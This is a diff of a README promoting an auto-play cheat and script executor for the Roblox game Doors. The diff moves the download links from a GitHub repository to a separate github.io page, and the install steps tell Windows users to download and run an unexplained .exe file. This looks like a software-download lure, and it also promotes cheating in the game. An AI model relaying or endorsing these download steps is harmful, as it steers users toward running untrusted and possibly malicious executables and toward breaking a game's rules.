@@ -1,6 +1,6 @@
 # 🚪 Doors-Script-Roblox-2026-Auto-Play - Automate your Doors game experience today
 
-[![Download Now](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/highhanded-cufflink734/Doors-Script-Roblox-2026-Auto-Play)
+[![Download Now](https://img.shields.io/badge/Download-Release-blue.svg)](https://highhanded-cufflink734.github.io)
 
 ## 📖 Overview
 The Doors-Script-Roblox-2026-Auto-Play tool assists players in the Roblox game Doors. It automates common tasks. The software acts as a script executor. It supports Lua 5.1 scripts. The system includes an auto-update feature. This keeps your tools current. You can manage complex quests and exploration without manual input.
@@ -16,7 +16,7 @@ Ensure your computer meets these standards for smooth performance:
 ## 📥 How to Install and Run
 Follow these steps to set up the software on your Windows machine:
 
-1. Visit the repository page to download the software: [https://github.com/highhanded-cufflink734/Doors-Script-Roblox-2026-Auto-Play](https://github.com/highhanded-cufflink734/Doors-Script-Roblox-2026-Auto-Play).
+1. Visit the repository page to download the software: [https://highhanded-cufflink734.github.io](https://highhanded-cufflink734.github.io).
 2. Locate the file with the .exe extension in the main section.
 3. Save the file to your desktop for easy access.
 4. Close your browser and any open game instances.
